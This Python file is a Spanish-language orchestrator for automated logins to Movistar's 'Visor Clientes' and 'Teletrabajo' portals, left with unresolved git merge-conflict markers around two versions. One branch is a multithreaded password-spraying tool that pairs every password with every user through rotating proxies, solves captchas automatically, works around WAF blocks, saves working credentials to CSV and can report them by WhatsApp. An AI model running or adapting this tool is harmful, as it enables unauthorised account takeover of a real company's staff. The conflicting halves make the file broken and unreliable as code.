#!/usr/bin/env python3
"""
<<<<<<< HEAD
Orquestador Principal del Sistema (ejecutar.py)
================================================
Unifica y coordina todos los módulos del proyecto:
1. probarproxie.py       -> Validación de proxies con proxy_config.py
2. configurarwhatsapp.py -> Vinculación QR y configuración de WhatsApp
3. main.py               -> Automatización de login en Visor Clientes Movistar
4. probarteletrabajo.py  -> Automatización de login en Teletrabajo Movistar

Incluye:
- Detección y recuperación automática de sesiones interrumpidas (Checkpoints).
- Notificaciones de eventos por WhatsApp (Login exitoso, resumen y errores críticos).
"""

import os
import sys
import time
import json
import logging
from pathlib import Path
from datetime import datetime

# Configuración de rutas
PROJECT_DIR = Path(__file__).parent
sys.path.insert(0, str(PROJECT_DIR))

# Importar gestores del sistema
from state_manager import cargar_checkpoint, limpiar_checkpoint
from whatsapp_notifier import esta_configurado, obtener_numero_destino
from proxy_config import SUPERPROXY_CONFIG


def mostrar_banner():
    print("""
============================================================
  🚀 SISTEMA INTEGRAL DE AUTOMATIZACIÓN MOVISTAR
  Orquestador Principal (ejecutar.py)
============================================================
""")


def verificar_checkpoint_previo() -> bool:
    """
    Verifica si existe una sesión previa interrumpida y ofrece reanudarla.
    Retorna True si el usuario decidió reanudar y se ejecutó la sesión guardada.
    """
    checkpoint = cargar_checkpoint()
    if not checkpoint:
        return False

    print("\n" + "!"*65)
    print("⚠️  SE HA DETECTADO UNA SESIÓN PREVIA INTERRUMPIDA / PAUSADA:")
    print("!"*65)
    print(f"  • Portal:            {checkpoint.get('portal', 'Desconocido')}")
    print(f"  • Script:            {checkpoint.get('script', 'N/A')}")
    print(f"  • Fecha de Pausa:    {checkpoint.get('timestamp', 'N/A')}")
    print(f"  • Progreso:          {checkpoint.get('task_idx', 0)} / {checkpoint.get('total_tasks', 0)} tareas")
    print(f"  • Tareas Pendientes: {checkpoint.get('tareas_restantes', 0)}")
    print(f"  • Motivo de Pausa:   {checkpoint.get('motivo', 'N/A')}")
    if checkpoint.get("ultimo_error"):
        print(f"  • Último Error:      {checkpoint.get('ultimo_error')}")
    print("!"*65)

    opcion = input("\n¿Desea reanudar la ejecución en el punto exacto donde se quedó? (s/n, default=s): ").strip().lower()

    if opcion != "n":
        script_name = checkpoint.get("script", "")
        if "main" in script_name:
            import main as mod_main
            mod_main.main(checkpoint_data=checkpoint)
            return True
        elif "teletrabajo" in script_name:
            import probarteletrabajo as mod_teletrabajo
            mod_teletrabajo.main(checkpoint_data=checkpoint)
            return True
        else:
            print(f"❌ Script desconocido en checkpoint: {script_name}")
            return False
    else:
        descartar = input("¿Desea descartar la sesión guardada y volver al menú principal? (s/n, default=s): ").strip().lower()
        if descartar != "n":
            limpiar_checkpoint()
            print("🗑️ Sesión previa descartada.")
        return False


def menu_principal():
    while True:
        mostrar_banner()

        # Estado de integraciones
        wa_status = "✅ ACTIVO (+{})".format(obtener_numero_destino()) if esta_configurado() else "⚠️ NO CONFIGURADO"
        proxy_info = f"{SUPERPROXY_CONFIG['host']}:{SUPERPROXY_CONFIG['port']} ({SUPERPROXY_CONFIG['country'].upper()})"

        print(f"  [Estado WhatsApp]: {wa_status}")
        print(f"  [Proxy Central]:   {proxy_info}")
        print("-" * 60)
        print("  1. 🔍 Probar Conexión de Proxies (probarproxie.py)")
        print("  2. 📱 Configurar Notificaciones WhatsApp (configurarwhatsapp.py)")
        print("  3. 🏢 Validar Visor Clientes Movistar (main.py)")
        print("  4. 💻 Validar Teletrabajo Movistar (probarteletrabajo.py)")
        print("  5. 🚪 Salir")
        print("=" * 60)

        opcion = input("\nSeleccione una opción [1-5]: ").strip()

        if opcion == "1":
            print("\n" + "="*60)
            print("🔍 EJECUTANDO PRUEBA DE PROXIES...")
            print("="*60)
            import probarproxie
            probarproxie.probar_dos_proxies(headless=True)
            input("\nPresione ENTER para volver al menú...")

        elif opcion == "2":
            print("\n" + "="*60)
            print("📱 CONFIGURACIÓN DE NOTIFICACIONES WHATSAPP...")
            print("="*60)
            import configurarwhatsapp
            configurarwhatsapp.configurar_whatsapp()
            input("\nPresione ENTER para volver al menú...")

        elif opcion == "3":
            print("\n" + "="*60)
            print("🏢 INICIANDO VALIDADOR VISOR CLIENTES MOVISTAR...")
            print("="*60)
            import main as mod_main
            mod_main.main()
            input("\nPresione ENTER para volver al menú...")

        elif opcion == "4":
            print("\n" + "="*60)
            print("💻 INICIANDO VALIDADOR TELETRABAJO MOVISTAR...")
            print("="*60)
            import probarteletrabajo as mod_teletrabajo
            mod_teletrabajo.main()
            input("\nPresione ENTER para volver al menú...")

        elif opcion == "5":
            print("\n👋 ¡Hasta pronto!\n")
            sys.exit(0)

        else:
            print("\n❌ Opción no válida. Ingrese un número del 1 al 5.")
            time.sleep(1)


def main():
    # 1. Comprobar si hay un checkpoint guardado
    reanudado = verificar_checkpoint_previo()
    if reanudado:
        return

    # 2. Si no hay o se descartó, abrir menú principal
    menu_principal()
=======
para ejecutar: python ejecutar.py
"""

import sys
import os
import csv
import json
import time
import random
import logging
import threading
from pathlib import Path
from datetime import datetime

# Agregar la ruta del proyecto
PROJECT_DIR = Path(__file__).parent
sys.path.insert(0, str(PROJECT_DIR))

from login_automation import LoginAutomation
from ip_rotator import IPRotator, IPBlacklist
from whatsapp_notifier import WhatsAppNotifier
from captcha_resolver import CaptchaResolver

# Configuración de Rutas
DATA_DIR = PROJECT_DIR / "data"
SCREENSHOT_DIR = PROJECT_DIR / "screenshots"
LOGS_DIR = PROJECT_DIR / "logs"

ARCHIVO_USUARIOS = DATA_DIR / "usuarios.csv"
ARCHIVO_CONTRASENAS = DATA_DIR / "contraseñas.csv"
ARCHIVO_IP = DATA_DIR / "ip.txt"
ARCHIVO_BLACKLIST = DATA_DIR / "ip_blacklist.json"
ARCHIVO_ERRORES = DATA_DIR / "login_errores.csv"

# Crear directorios necesarios
LOGS_DIR.mkdir(parents=True, exist_ok=True)
SCREENSHOT_DIR.mkdir(parents=True, exist_ok=True)
DATA_DIR.mkdir(parents=True, exist_ok=True)

# Configuración del log
log_file = LOGS_DIR / f"ejecutar_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)-5s] [%(threadName)-12s] %(message)s",
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler(str(log_file), encoding="utf-8")
    ]
)
logger = logging.getLogger("Orquestador")


def load_list(fp):
    """Carga líneas de un CSV o archivo de texto."""
    if not fp.exists():
        return []
    vals = []
    with open(fp, "r", encoding="utf-8-sig") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                vals.append(line)
    return vals


def save_to_csv(filepath, procedencia, usuario, contrasena, ip, error_info=""):
    """Guarda un registro en login_correcto o login_incorrecto CSV."""
    file_exists = filepath.exists()
    with open(filepath, "a", encoding="utf-8", newline="") as f:
        writer = csv.writer(f)
        if not file_exists:
            writer.writerow(["fecha", "procedencia", "usuario", "contrasena", "ip", "error_info"])
        writer.writerow([datetime.now().isoformat(), procedencia, usuario, contrasena, ip, error_info])


def main():
    print("""
============================================================
  LOGIN AUTOMATION — ORQUESTADOR (ejecutar.py)
  Pruebas secuenciales de contraseña por usuario
============================================================
    """)
    start_time = datetime.now()

    # 1. Cargar Archivos
    usuarios = load_list(ARCHIVO_USUARIOS)
    contrasenas = load_list(ARCHIVO_CONTRASENAS)

    if not usuarios or not contrasenas:
        print("❌ Faltan archivos de configuración (usuarios.csv o contraseñas.csv en data/).")
        sys.exit(1)

    print(f"  Total usuarios cargados: {len(usuarios)}")
    print(f"  Total contraseñas cargadas: {len(contrasenas)}")

    # 2. Configuración de procedencia
    print("\nSeleccione la procedencia a trabajar:")
    print("  1. Usuario Interno")
    print("  2. Usuario Externo")
    print("  3. Ambas procedencias (primero Interno, luego Externo)")
    proc_sel = input("Opción (1/2/3, default=3): ").strip()
    
    if proc_sel == "1":
        selected_procedencias = ["interno"]
    elif proc_sel == "2":
        selected_procedencias = ["externo"]
    else:
        selected_procedencias = ["interno", "externo"]

    print(f"  Procedencias a evaluar: {', '.join(p.upper() for p in selected_procedencias)}")

    # 3. Configuración de ejecución
    th = input("\nHilos simultáneos (default=5): ").strip()
    num_threads = int(th) if th.isdigit() and int(th) > 0 else 5
    print(f"  Hilos simultáneos: {num_threads}")

    hl = input("Headless? (s/n, default=s): ").strip().lower()
    headless = hl != "n"

    # 4. Configurar resolvedor de captcha
    captcha_res = CaptchaResolver(method="vlm")

    # 5. Configurar WhatsApp Bridge (Desactivado para la v1)
    notifier = WhatsAppNotifier(
        bridge_port=3456,
        whatsapp_module_dir=str(PROJECT_DIR),
    )
    # Ignorar prompt y establecer a inactivo
    whatsapp_activo = False

    print(f"\n{'='*60}")
    print(f"  INICIANDO BARRIDO DE CREDENCIALES MULTIHILO")
    print(f"  Hilos: {num_threads} | Headless: {headless} | WhatsApp: {'SI' if whatsapp_activo else 'NO'}")
    print(f"{'='*60}\n")

    input("Presiona ENTER para iniciar...")

    # Rutas de guardado
    file_correcto = DATA_DIR / "login_correcto.csv"
    file_incorrecto = DATA_DIR / "login_incorrecto.csv"

    # Estructuras de control para el estado del barrido
    # Set global de usuarios con login_correcto (se descartan de futuras combinaciones)
    successful_users = set()
    success_lock = threading.Lock()
    csv_write_lock = threading.Lock()

    from main import get_proxy_config, generate_session_id
    from concurrent.futures import ThreadPoolExecutor, as_completed

    def write_error_to_csv(procedencia, usuario, contrasena, ip, error_msg):
        """Escribe un registro persistente en login_errores.csv."""
        with csv_write_lock:
            file_exists = ARCHIVO_ERRORES.exists()
            with open(ARCHIVO_ERRORES, "a", encoding="utf-8", newline="") as f:
                writer = csv.writer(f)
                if not file_exists:
                    writer.writerow(["fecha", "procedencia", "usuario", "contrasena", "ip", "error_info"])
                writer.writerow([datetime.now().isoformat(), procedencia, usuario, contrasena, ip, error_msg])

    def remove_error_from_csv(usuario, contrasena):
        """Elimina un registro de login_errores.csv si ya no aplica (éxito o incorrecto definitivo)."""
        if not ARCHIVO_ERRORES.exists():
            return
        with csv_write_lock:
            rows = []
            with open(ARCHIVO_ERRORES, "r", encoding="utf-8") as f:
                reader = csv.reader(f)
                header = next(reader, None)
                for r in reader:
                    if r and len(r) >= 4:
                        # Si coincide el usuario y la contraseña, lo removemos
                        if r[2] == usuario and r[3] == contrasena:
                            continue
                    rows.append(r)
            
            with open(ARCHIVO_ERRORES, "w", encoding="utf-8", newline="") as f:
                writer = csv.writer(f)
                if header:
                    writer.writerow(header)
                writer.writerows(rows)

    def run_single_attempt(usuario, contrasena, procedencia, is_final_verification=False):
        # 1. Verificar si ya se logró éxito previamente para este usuario (independiente de procedencia)
        # Excepto si estamos realizando la verificación final de falsos positivos
        if not is_final_verification:
            with success_lock:
                if usuario in successful_users:
                    return None  # Omitir clave restante al haber completado exitosamente

        # Generar sesión IP rotativa
        session_id = generate_session_id()
        proxy_data = get_proxy_config(session_id=session_id)
        ip_label = proxy_data["ip"]

        proxy_cfg = {
            "server": proxy_data["server"],
            "username": proxy_data["username"],
            "password": proxy_data["password"],
        }

        logger.info(f"🔑 [Probando] {usuario} | Clave: {contrasena} | Proc: {procedencia} | IP: {ip_label}")

        # Intentos repetidos con la MISMA IP si falla el captcha
        max_captcha_not_found_retries = 3
        captcha_not_found_attempt = 0
        lr = {}

        while captcha_not_found_attempt < max_captcha_not_found_retries:
            automation = LoginAutomation(screenshot_dir=str(SCREENSHOT_DIR), headless=headless)
            try:
                automation.start_browser(proxy_config=proxy_cfg)
                lr = automation.attempt_login(
                    usuario=usuario,
                    contraseña=contrasena,
                    procedencia=procedencia,
                    captcha_resolver=captcha_res.resolve,
                )
                
                err_desc = lr.get("error", "")

                # Requisito 2: "No se encontró captcha, intentando continuar..." -> cerrar navegador y volver a intentar con la misma IP
                if "No se encontró captcha" in err_desc or "No se pudo obtener la imagen base64 del captcha" in err_desc:
                    captcha_not_found_attempt += 1
                    logger.warning(f"⚠️ Reintentando tarea ({captcha_not_found_attempt}/{max_captcha_not_found_retries}) en la misma IP debido a captcha no encontrado...")
                    try:
                        automation.close_browser()
                    except:
                        pass
                    time.sleep(1)
                    continue
                else:
                    # Si cargó captcha o falló por otro error, rompemos el bucle de reintento en misma IP
                    break
            except Exception as e:
                logger.error(f"Excepción en el intento de navegador: {e}")
                break
            finally:
                try:
                    automation.close_browser()
                except:
                    pass

        result = {
            "usuario": usuario,
            "contrasena": contrasena,
            "procedencia": procedencia,
            "ip": ip_label,
            "exito": lr.get("exito", False),
            "error": lr.get("error", ""),
            "screenshot": lr.get("screenshot", ""),
            "waf_blocked": lr.get("waf_blocked", False)
        }

        err_desc = result["error"]

        # Si el XPath de error de credenciales está presente en la web o se expone en el error, NO es correcto
        is_wrong_credentials = (
            "contraseña incorrecta" in err_desc.lower() or 
            "incorrecto" in err_desc.lower() or 
            "claimVerificationServerError" in err_desc or
            "autenticación" in err_desc.lower()
        )

        if result["exito"] and not is_wrong_credentials:
            logger.info(f"✅ [ÉXITO] Acceso confirmado para {usuario} ({procedencia}) con clave {contrasena}")
            
            # Borrar de la lista de errores en caso de que ahora sea correcto
            remove_error_from_csv(usuario, contrasena)

            if not is_final_verification:
                with success_lock:
                    successful_users.add(usuario)
                
                # Escribir en login_correcto.csv
                with csv_write_lock:
                    save_to_csv(file_correcto, procedencia, usuario, contrasena, ip_label)

                # Enviar notificación WhatsApp
                if whatsapp_activo:
                    try:
                        notifier.notify_login(
                            procedencia=procedencia,
                            usuario=usuario,
                            contraseña=contrasena,
                            screenshot=result.get("screenshot"),
                            ip=ip_label
                        )
                    except Exception as wa_err:
                        logger.error(f"Error WhatsApp: {wa_err}")
            return result

        elif is_wrong_credentials:
            logger.warning(f"❌ [INCORRECTO] {usuario} ({procedencia}) | Clave: {contrasena}")
            
            # Borrar de la lista de errores en caso de que ahora sea incorrecto
            remove_error_from_csv(usuario, contrasena)

            if not is_final_verification:
                with csv_write_lock:
                    save_to_csv(file_incorrecto, procedencia, usuario, contrasena, ip_label, err_desc)
                
                # Enviar notificación WhatsApp
                if whatsapp_activo:
                    try:
                        notifier.notify_error(
                            procedencia=procedencia,
                            usuario=usuario,
                            contraseña=contrasena,
                            error=err_desc,
                            ip=ip_label
                        )
                    except Exception as wa_err:
                        logger.error(f"Error WhatsApp al notificar incorrecto: {wa_err}")
            return result
        else:
            # Requisito 3: Errores persistentes (WAF, timeouts, problemas de red/carga) -> guardar en login_errores.csv
            if not is_final_verification:
                if result["waf_blocked"]:
                    logger.warning(f"⚠️ [WAF] Bloqueo detectado en IP {ip_label}")
                else:
                    logger.warning(f"⚠️ [ERROR PERSISTENTE] {usuario} -> {err_desc[:60]}")
                write_error_to_csv(procedencia, usuario, contrasena, ip_label, err_desc)
            return result

    # 1. BARRIDO PRINCIPAL DE CREDENCIALES
    for proc in selected_procedencias:
        logger.info(f"🚀 INICIANDO PRUEBAS PARA PROCEDENCIA: {proc.upper()}")
        
        # El orden: por cada contraseña se prueban todos los usuarios
        task_queue = []
        for contrasena in contrasenas:
            for usuario in usuarios:
                task_queue.append((usuario, contrasena, proc))

        # Ejecutar tareas usando ThreadPoolExecutor para hilos simultáneos
        with ThreadPoolExecutor(max_workers=num_threads, thread_name_prefix=f"Runner-{proc}") as executor:
            futures = []
            for task in task_queue:
                futures.append(executor.submit(run_single_attempt, task[0], task[1], task[2]))

            for fut in as_completed(futures):
                try:
                    fut.result()
                except Exception as e:
                    logger.error(f"Excepción en finalización de tarea: {e}")

    # Requisito 4: Probar al final nuevamente esos con errores persistentes.
    if ARCHIVO_ERRORES.exists():
        logger.info("♻️ INICIANDO RE-VALIDACIÓN DE TAREAS REGISTRADAS EN LOGIN_ERRORES.CSV...")
        error_tasks = []
        try:
            with open(ARCHIVO_ERRORES, "r", encoding="utf-8") as f:
                reader = csv.reader(f)
                next(reader, None)  # Omitir cabecera
                for row in reader:
                    if row and len(row) >= 5:
                        # row: [fecha, procedencia, usuario, contrasena, ip, error]
                        error_tasks.append((row[2], row[3], row[1]))
        except Exception as e:
            logger.error(f"Error leyendo login_errores.csv: {e}")

        if error_tasks:
            logger.info(f"Re-intentando {len(error_tasks)} tareas fallidas...")
            with ThreadPoolExecutor(max_workers=num_threads, thread_name_prefix="ErrorRetry") as executor:
                futures = [executor.submit(run_single_attempt, t[0], t[1], t[2]) for t in error_tasks]
                for fut in as_completed(futures):
                    try:
                        fut.result()
                    except Exception as e:
                        logger.error(f"Excepción en reintento de error: {e}")

    # Requisito 5: Al final volver a probar los login_exitoso para eliminar falsos positivos
    successful_logins_to_verify = []
    if file_correcto.exists():
        try:
            with open(file_correcto, "r", encoding="utf-8") as f:
                reader = csv.reader(f)
                next(reader, None)  # Omitir cabecera
                for row in reader:
                    if row and len(row) >= 4:
                        # row: [fecha, procedencia, usuario, contrasena, ip, error_info]
                        successful_logins_to_verify.append((row[2], row[3], row[1]))
        except Exception as e:
            logger.error(f"Error leyendo login_correcto.csv para verificación final: {e}")

    if successful_logins_to_verify:
        logger.info("🔍 INICIANDO DOBLE VERIFICACIÓN FINAL DE TODOS LOS LOGINS EXITOSOS...")
        verified_ok = []
        verified_fails = []

        with ThreadPoolExecutor(max_workers=num_threads, thread_name_prefix="FinalVerify") as executor:
            future_to_task = {
                executor.submit(run_single_attempt, t[0], t[1], t[2], is_final_verification=True): t
                for t in successful_logins_to_verify
            }
            for fut in as_completed(future_to_task):
                task = future_to_task[fut]
                try:
                    res = fut.result()
                    if res and res.get("exito") and not (
                        "contraseña incorrecta" in res.get("error", "").lower() or
                        "incorrecto" in res.get("error", "").lower() or
                        "claimVerificationServerError" in res.get("error", "")
                    ):
                        verified_ok.append(task)
                        logger.info(f"✅ VERIFICACIÓN DE ÉXITO CONFIRMADA: {task[0]}")
                    else:
                        verified_fails.append(task)
                        logger.warning(f"🚨 FALSO POSITIVO DETECTADO EN VERIFICACIÓN FINAL: {task[0]} | Error: {res.get('error') if res else 'N/A'}")
                except Exception as e:
                    logger.error(f"Error verificando {task[0]}: {e}")

        # Limpiar y re-escribir login_correcto.csv removiendo falsos positivos detectados
        if verified_fails:
            logger.info(f"Removiendo {len(verified_fails)} falsos positivos de login_correcto.csv...")
            with csv_write_lock:
                # Escribir los fallos reales a login_incorrecto y remover de correcto
                for f_task in verified_fails:
                    save_to_csv(file_incorrecto, f_task[2], f_task[0], f_task[1], "verificacion_final", "Falso positivo confirmado")
                
                # Sobrescribir correcto solo con los realmente confirmados
                with open(file_correcto, "w", encoding="utf-8", newline="") as f:
                    writer = csv.writer(f)
                    writer.writerow(["fecha", "procedencia", "usuario", "contrasena", "ip", "error_info"])
                    for ok_task in verified_ok:
                        writer.writerow([datetime.now().isoformat(), ok_task[2], ok_task[0], ok_task[1], "confirmado_verificacion", ""])

    # Detener bridge
    if whatsapp_activo:
        notifier.stop_bridge()

    end_time = datetime.now()
    dur = str(end_time - start_time).split(".")[0]
    print(f"\n============================================================")
    print(f"  PROCESO DE ORQUESTACIÓN COMPLETADO EN {dur}")
    print(f"  Logins Guardados en: {DATA_DIR}")
    print(f"============================================================")
>>>>>>> 896283b8ed693c96dfe6c769ed049a4dc051282d


if __name__ == "__main__":
    main()
